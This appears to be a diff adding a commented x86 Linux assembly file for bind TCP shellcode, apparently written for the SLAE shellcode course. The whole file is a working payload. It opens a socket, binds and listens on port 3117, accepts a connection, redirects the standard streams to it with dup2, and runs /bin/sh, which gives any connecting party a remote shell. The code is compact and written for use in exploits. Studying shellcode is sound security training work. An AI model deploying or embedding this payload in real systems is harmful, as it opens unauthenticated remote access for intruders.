@@ -1,0 +1,116 @@
+; Shellcode Title: Bind TCP Shell
+; Date: 20-02-2018
+; Student Id: SLAE-1058
+; Tested on: Ubuntu 12.04 LTS x86
+
+
+
+global _start
+
+section .text
+_start:
+
+
+; syscall socketcall
+; #define __NR_socketcall         102
+; socket()
+; #define SYS_SOCKET	1		/* sys_socket(2)		*/
+
+	xor ebx, ebx    	; set ebx to zero
+	mul ebx			; set eax/edx to zero
+				    
+	push eax        	; push 0, last arg from socket
+	push 0x01       	; push 1, SOCK_STREAM
+	push 0x02       	; push 2, AF_INET
+	mov ecx, esp		; ECX points now to all arguments
+                    
+	mov al, 0x66    
+	inc bl			; same as mov bl, 0x01
+	int 0x80
+
+
+; syscall socketcall
+; #define __NR_socketcall         102
+; bind()
+; #define SYS_BIND	2		/* sys_bind(2)			*/
+
+	mov edi, eax					; store eax to edi (eax = sockfd from previous syscall)
+
+	; Prepare sockaddr_in structure:
+	push edx			; push 0 (0x00*4)
+	push word 0x2d0c		; push htons(3117)
+	push word 2			; push AF_INET
+	mov ecx,esp			; mov in ECX the sockaddr_in structure pointer to use in bind()
+                        
+	                    
+	push 0x10			; 16 bytes (socklen_t addrlen from bind())
+	push ecx			; pushing address of sockaddr_in pointer
+	push edi			; sockfd
+                        
+	mov ecx, esp			; ECX points to *args socketcall()
+	mov al, 0x66
+	mov bl, 0x02
+	int 0x80
+
+
+; syscall socketcall
+; #define __NR_socketcall         102
+; listen()
+; #define SYS_LISTEN	4		/* sys_listen(2)		*/
+
+	xor ebx, ebx
+	mul ebx				; flush registers eax/edx
+	push ebx			; null bytes (int backlog from listen())
+	push edi			; sockfd
+                        
+	mov ecx, esp			; ECX points to *args socketcall()
+	mov al, 0x66
+	mov bl, 0x04
+	int 0x80
+
+	
+; syscall socketcall
+; #define __NR_socketcall         102
+; accept()
+; #define SYS_ACCEPT	5		/* sys_accept(2)		*/
+
+	xor ebx, ebx
+	mul ebx				; flush registers eax/edx
+	push ebx            
+	push ebx            
+	push edi			; sockfd
+
+	mov al, 0x66
+	mov bl, 0x05
+	mov ecx, esp
+	int 0x80
+
+; syscall dup2
+; #define __NR_dup2                63
+; loop from 2 to 0 and execute 0x80 for each one.
+
+	mov ebx, eax			; store socketfd in ebx
+	xor ecx, ecx        
+	mul ecx				; flush registers eax/edx
+	mov cl, 0x02			; mov 2 to cl (dup 2, 1, 0)
+                        
+dup2:                   
+	mov al, 63			; this mov is here cause of the return of 0x80
+	int 0x80            
+	dec ecx             
+	jns dup2			; jump to dup2 if ecx != -1 (sf == 0)
+
+	
+; syscall execve
+; #define __NR_execve              11
+; execute /bin/sh
+
+	xor eax,eax
+	push eax
+	push 0x68732f2f      	; hs// - take care to the little endian representation
+	push 0x6e69622f      	; nib/
+	mov ebx, esp         	; pointer to command string
+	mov ecx, eax
+	mov edx, eax
+	mov al, 11
+	int 0x80
